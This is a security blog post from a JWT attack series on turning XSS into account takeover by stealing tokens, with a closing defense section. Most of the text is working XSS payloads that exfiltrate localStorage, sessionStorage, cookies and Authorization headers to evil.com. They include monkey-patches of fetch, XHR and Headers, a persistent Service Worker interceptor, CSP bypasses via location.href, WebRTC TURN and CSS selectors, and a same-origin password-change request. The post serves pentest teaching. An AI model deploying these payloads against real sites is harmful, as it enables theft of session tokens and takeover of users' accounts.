---
title: "JWT, Part 13: XSS + JWT = Full Account Takeover"
date: 2026-03-28T10:13:00+03:00
number: 13
tags: ["jwt", "security", "web", "auth"]
summary: "Found a Reflected XSS? If the app stores JWTs in localStorage, that's not just alert(1) — it's a full takeover of every account. We cover theft from every storage type, CSP bypass via WebRTC and CSS injection, and the only defenses that actually work."
---

**Table of contents:**
- [Step zero: where is the token stored](#step-zero-where-is-the-token-stored)
- [localStorage: one line of JavaScript](#localstorage-one-line-of-javascript)
- [sessionStorage: same deal, but tab-scoped](#sessionstorage-same-deal-but-tab-scoped)
- [Cookie without HttpOnly: document.cookie](#cookie-without-httponly-documentcookie)
- [HttpOnly cookie: JavaScript can't see it, but there are nuances](#httponly-cookie-javascript-cant-see-it-but-there-are-nuances)
- [In-memory (JS variable): interception via monkey-patch](#in-memory-js-variable-interception-via-monkey-patch)
- [CSP bypass for exfiltration](#csp-bypass-for-exfiltration)
- [Defense: Token Sidejacking and alternatives](#defense-token-sidejacking-and-alternatives)
- [Storage summary](#storage-summary)
- [What to check during a pentest](#what-to-check-during-a-pentest)
- [What's next](#whats-next)

In articles 3-8 we were forging JWTs. But why forge when you can just steal? Found a Reflected XSS? If the app stores JWTs in localStorage, this isn't just `alert(1)` - it's a full takeover of every account. And logging out won't help: JWT is stateless by default, the token stays valid until `exp`. A server-side revocation list solves that, but most implementations don't have one.

## Step zero: where is the token stored

Before you steal anything, you need to find it. Open DevTools:

1. **Application > Local Storage / Session Storage**: if you see a key like `token`, `jwt`, or `access_token` - that's it
2. **Application > Cookies**: check the `HttpOnly`, `Secure`, and `SameSite` flags. No `HttpOnly`? The cookie is readable via `document.cookie`
3. **Network > Headers**: look for `Authorization: Bearer` in outgoing requests. Token in a header means it's stored in a JS variable (in-memory)
4. **Console**: try `localStorage.getItem('token')` and `document.cookie`

Once you've identified the storage mechanism, pick the right vector from the sections below.

## localStorage: one line of JavaScript

The most common and most dangerous storage option. JavaScript has full access to localStorage. One line and the token is yours:

```javascript
// Minimal payload: image beacon
<script>
new Image().src='https://evil.com/s?t='
+btoa(localStorage.getItem('token'));
</script>
```

One caveat: image beacons encode data in the URL, and URLs are limited to ~8000 characters in Chrome. A JWT with a rich payload (Keycloak, Azure AD) might not fit. For large tokens, use POST:

```javascript
// fetch with POST
<script>
fetch('https://evil.com/s',{method:'POST',
mode:'no-cors',body:JSON.stringify({
jwt:localStorage.getItem('token'),
all:JSON.stringify(localStorage),
url:location.href})});
</script>

// sendBeacon: works even when the tab is closing
<svg onload="navigator.sendBeacon(
'https://evil.com/s',
localStorage.getItem('token'))">

// Full dump: no need to know the key name
<script>
var d={};
for(var i=0;i<localStorage.length;i++){
var k=localStorage.key(i);
d[k]=localStorage.getItem(k);}
navigator.sendBeacon('https://evil.com/s',
JSON.stringify(d));
</script>
```

The image beacon is the most compact option and doesn't trigger CORS errors. `sendBeacon` works in `onload`/`onbeforeunload` when fetch and XHR no longer have time to fire. The full dump grabs everything in localStorage without needing to know any key names.

**Don't forget the refresh token.** It's often sitting in the same localStorage right next to the access token. The access token lives for 15 minutes; the refresh token lives for weeks. Steal the refresh token and you can generate new access tokens through the token endpoint indefinitely - even after the user changes their password (assuming the server hasn't implemented token rotation). Always dump all keys from storage, not just `token`.

## sessionStorage: same deal, but tab-scoped

```javascript
<script>
fetch('https://evil.com/s',{method:'POST',
mode:'no-cors',body:JSON.stringify({
jwt:sessionStorage.getItem('token')})});
</script>
```

The key difference - data doesn't travel between tabs and gets destroyed when the tab closes. Less dangerous than localStorage, because the attacker has to be executing in the same tab. But XSS in the same tab means full access.

An additional vector: `window.postMessage`. If the app passes JWTs through postMessage with a wildcard origin (`'*'` instead of a specific domain), any window can intercept it:

```javascript
// Vulnerable app code (problem: '*' instead of a specific origin):
window.parent.postMessage({token: sessionStorage.getItem('jwt')}, '*');

// Interception on attacker.com (via iframe):
window.addEventListener('message', function(e) {
  // Attacker intentionally skips checking e.origin - they don't care where it came from
  fetch('https://evil.com/s',{method:'POST',
  mode:'no-cors',body:JSON.stringify(e.data)});
});
```

## Cookie without HttpOnly: document.cookie

Plenty of apps set the JWT in a cookie but forget the `HttpOnly` flag. Checking is trivial: just run `document.cookie` in the console. If you see your token, theft is a one-liner:

```javascript
<script>
new Image().src='https://evil.com/s?c='+btoa(document.cookie);
</script>
```

This is a middle ground between localStorage and HttpOnly cookies. You see it all the time, especially in legacy apps.

## HttpOnly cookie: JavaScript can't see it, but there are nuances

Direct theft is impossible: `document.cookie` doesn't return HttpOnly cookies. This is real protection against XSS-based token theft.

But you need to understand the difference between **same-origin XSS** and **cross-site CSRF**.

**Cross-site CSRF (attack from an external domain).** Since Chrome 80 (February 2020), all cookies default to `SameSite=Lax`. A cross-site POST won't attach the cookie. This code running from an external domain **does not work** in modern browsers:

```html
<!-- DOES NOT WORK with SameSite=Lax (default since 2020) -->
<script>
fetch('https://target.com/api/user/password',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({newPassword:'hacked123'})
});
</script>
```

`credentials:'include'` is a CORS mechanism - it doesn't bypass SameSite. The browser simply won't attach the cookie to a cross-site POST.

**Same-origin XSS (code running on target.com itself).** SameSite doesn't help here, because the request comes from the same origin. With XSS on target.com, you make requests on behalf of the victim directly:

```javascript
// Same-origin XSS: SameSite does NOT protect, cookie is attached
<script>
fetch('/api/user/password',{
  method:'POST',
  credentials:'same-origin',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({newPassword:'hacked123'})
});
</script>
```

The path is relative (`/api/...`), no domain. The request goes to the same origin. The browser treats it as same-site and attaches the cookie. SameSite=Lax, SameSite=Strict - doesn't matter with same-origin XSS.

So with HttpOnly cookies: cross-site CSRF is blocked by SameSite=Lax (default since 2020). Same-origin XSS still works - you don't steal the token, but you execute actions on behalf of the victim. For full protection you need a CSRF token even with SameSite (defense in depth).

## In-memory (JS variable): interception via monkey-patch

The token is stored only in a JavaScript variable and sent via `Authorization: Bearer`. Not in localStorage, not in a cookie. Sounds safe. But XSS gives you access to the page's execution context. You intercept:

```javascript
// Monkey-patch fetch to intercept Authorization
const orig=window.fetch;
window.fetch=function(url,opts){
  if(opts&&opts.headers){
    var h=opts.headers;
    var a=h['Authorization']||h.get&&h.get('Authorization');
    if(a)navigator.sendBeacon('https://evil.com/s',a);
  }
  return orig.apply(this,arguments);
};

// Monkey-patch XMLHttpRequest
const origXHR=XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader=function(k,v){
  if(k==='Authorization')
    navigator.sendBeacon('https://evil.com/s',v);
  return origXHR.apply(this,arguments);
};

// Full interception via the Headers API
// (catches new Headers(), Request objects, header arrays)
const origSet=Headers.prototype.set;
Headers.prototype.set=function(k,v){
  if(k.toLowerCase()==='authorization')
    navigator.sendBeacon('https://evil.com/s',v);
  return origSet.call(this,k,v);
};
```

The victim makes the next API request, and the token leaks from the header. No need to know where the variable lives.

**DPoP tokens (RFC 9449).** Monkey-patching works against DPoP too: you intercept the Access Token from `Authorization: DPoP` and the DPoP proof from the `DPoP` header. But there's a catch. The DPoP private key is stored as a `CryptoKey` with `extractable: false` - it can't be exported via JavaScript. The attacker can't generate new proofs after the tab closes. But while the victim is online, the monkey-patch intercepts ready-made proofs and can proxy requests in real time. This isn't offline token theft - it's live session hijacking.

**Service Worker: a persistent monkey-patch.** A regular monkey-patch dies when the page reloads. A Service Worker doesn't. If the attacker can register a SW (via XSS plus the ability to host a JS file on the same origin), the interception survives tab closure, page reloads, and even browser restarts:

```javascript
// sw.js (must be accessible as a file on the same origin)
self.addEventListener('fetch', function(e) {
  var auth = e.request.headers.get('Authorization');
  if (auth) {
    fetch('https://evil.com/s', {
      method: 'POST', mode: 'no-cors', body: auth
    });
  }
});

// Registration via XSS:
navigator.serviceWorker.register('/uploads/sw.js');
```

The bar is higher than a regular monkey-patch: you need a hosted JS file on the same origin (Service Workers can't be registered from inline scripts). But if there's a file upload endpoint, this is persistent token theft. Defense: the `Service-Worker-Allowed` header and the `worker-src` CSP directive.

## CSP bypass for exfiltration

The server has a Content Security Policy in place? CSP doesn't control every channel. Take this strict policy as an example:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'
```

This policy blocks fetch, XHR, and image beacons to external domains. But CSP has fundamental blind spots.

**Navigation: CSP doesn't control `location.href`.**

The simplest and most reliable bypass. The `navigate-to` directive was proposed in CSP Level 3, but **was removed from the spec and is not implemented in any browser**:

```javascript
<script>
location.href='https://evil.com/s?t='
+localStorage.getItem('token');
</script>
```

Works against any CSP. Downside: the user sees the redirect. But the token is already gone.

**WebRTC: bypasses most CSPs.**

The `webrtc` CSP directive exists in Chromium as an experiment, but it's not standardized and isn't used by real sites. The TURN server receives the JWT in the username field:

```javascript
<script>
var pc=new RTCPeerConnection({iceServers:[{
  urls:'turn:evil.com:3478',
  username:localStorage.getItem('token'),
  credential:'x'}]});
pc.createOffer().then(o=>pc.setLocalDescription(o));
</script>
```

In March 2026, Sansec discovered widespread WebRTC exploitation being used to steal payment data from major e-commerce sites. The skimmer used WebRTC DataChannels over DTLS-encrypted UDP - invisible to HTTP monitoring. This is not a theoretical vector: it works in production right now.

**CSS injection: no JavaScript required.**

If `style-src` allows inline styles, or the attacker controls a stylesheet, data can be extracted character by character using CSS attribute selectors:

```css
/* If the JWT is in a data attribute or a hidden field */
input[value^="eyJh"] { background: url(https://evil.com/?v=eyJh); }
input[value^="eyJi"] { background: url(https://evil.com/?v=eyJi); }
/* ... enumerate by character, automate with a script */
```

Works even with `script-src 'none'`. Slow (character by character), but requires no JavaScript.

**Historical techniques (don't work in 2024+):**

DNS prefetch (`link rel=dns-prefetch`): Chrome and Firefox have been blocking cross-origin dns-prefetch when CSP is present since around 2017. Dangling markup (`<img src="https://evil.com/?`): Chrome strips URLs containing `<` and newlines in attributes since Chrome 60 (2017). Both vectors appear in old CSP bypass writeups, but you can't rely on them.

## Defense: Token Sidejacking and alternatives

No client-side storage fully protects against XSS. localStorage and sessionStorage: trivial theft. Cookie without HttpOnly: same. HttpOnly cookie: same-origin XSS lets you act as the victim. In-memory: monkey-patch.

**Token Sidejacking** (OWASP JWT Cheat Sheet): binding the JWT to the browser via a fingerprint.

1. At login, generate a random fingerprint (256 bits)
2. The SHA-256 hash of the fingerprint goes into the JWT payload: `"fgp": "sha256(random)"`
3. The fingerprint itself is sent as an HttpOnly cookie: `fgp=random; HttpOnly; Secure; SameSite=Strict`
4. On every request, the server verifies: `sha256(cookie) == jwt.fgp`

```python
import hashlib, secrets, jwt as pyjwt
from flask import make_response

def login(user):
    fgp = secrets.token_hex(32)
    fgp_hash = hashlib.sha256(fgp.encode()).hexdigest()
    token = pyjwt.encode(
        {"sub": user, "fgp": fgp_hash},
        SECRET, algorithm="HS256")
    resp = make_response({"token": token})
    resp.set_cookie("fgp", fgp,
        httponly=True, secure=True, samesite="Strict")
    return resp

def verify_request(token, cookie_fgp):
    payload = pyjwt.decode(token, SECRET, algorithms=["HS256"])
    expected = hashlib.sha256(cookie_fgp.encode()).hexdigest()
    if payload["fgp"] != expected:
        raise Exception("Fingerprint mismatch")
    return payload
```

Stole the JWT via XSS? Useless: the HttpOnly cookie is inaccessible to JavaScript, so the fingerprint won't match. CSRF? Useless: you need the JWT for the API request, and it's in memory or localStorage. You need BOTH components at the same time.

**Alternative approaches:**

- **DPoP (RFC 9449):** binds the token to a client-side cryptographic key. Covered in article 12. The private key is stored as a non-extractable CryptoKey, so a stolen token is worthless without the key
- **BFF (Backend-for-Frontend):** the token never reaches the browser at all. The frontend talks to a BFF proxy via a session cookie; the BFF adds the JWT to requests going to the backend. XSS in the browser never sees the token
- **Short-lived tokens** (30s-2min) + token rotation: minimizes the exploitation window
- **Trusted Types** (`require-trusted-types-for 'script'` in CSP): prevents DOM XSS at the browser level by blocking direct string assignment to dangerous sinks (innerHTML, eval)

## Storage summary

- **localStorage**: XSS theft is trivial, one line of JavaScript. Don't forget the refresh token sitting right next to it
- **sessionStorage**: XSS theft is trivial, tab-scoped
- **Cookie without HttpOnly**: `document.cookie` is just as trivial as localStorage
- **HttpOnly cookie + SameSite=Lax (default)**: XSS theft is impossible, cross-site CSRF is blocked. Same-origin XSS still lets you perform actions as the victim
- **In-memory**: monkey-patching fetch/XHR/Headers intercepts the token. Service Worker makes the interception persistent
- **Token Sidejacking / DPoP / BFF**: binds the token to the client, or removes the token from the browser entirely

## What to check during a pentest

**Identifying storage:**

1. DevTools, Application, Storage: check localStorage and sessionStorage
2. DevTools, Application, Cookies: `HttpOnly`, `Secure`, `SameSite` flags
3. DevTools, Network, Headers: look for `Authorization: Bearer` / `DPoP`
4. Console: `localStorage.getItem('token')`, `document.cookie`

**localStorage / sessionStorage:**

5. Image beacon: `new Image().src` + `btoa(token)`
6. fetch POST with `mode:'no-cors'` for large tokens
7. Full dump of all keys (not just `token`)
8. Refresh token in the same storage

**Cookie:**

9. No `HttpOnly`? Steal via `document.cookie`
10. `SameSite=Lax` (default) blocks cross-site CSRF
11. Same-origin XSS: relative paths, `credentials:'same-origin'`

**In-memory:**

12. Monkey-patch fetch + XHR + `Headers.prototype`
13. DPoP: intercept proofs, key is non-extractable
14. Service Worker registration (requires a hosted JS file)

**CSP bypass:**

15. `location.href`: navigation, CSP doesn't control it
16. WebRTC TURN: token in the username field
17. CSS injection when `style-src` allows inline

**Defenses:**

18. Token Sidejacking: fingerprint in HttpOnly cookie + hash in JWT
19. DPoP: `Authorization: DPoP` instead of Bearer
20. BFF: check for direct API access bypassing the proxy

## What's next

Next up: lattice attacks. How leaking three bits of the nonce from each ECDSA signature gives you the full private key. You'll want the ECDSA math from article 9, the signing formulas, and nonce reuse concepts.
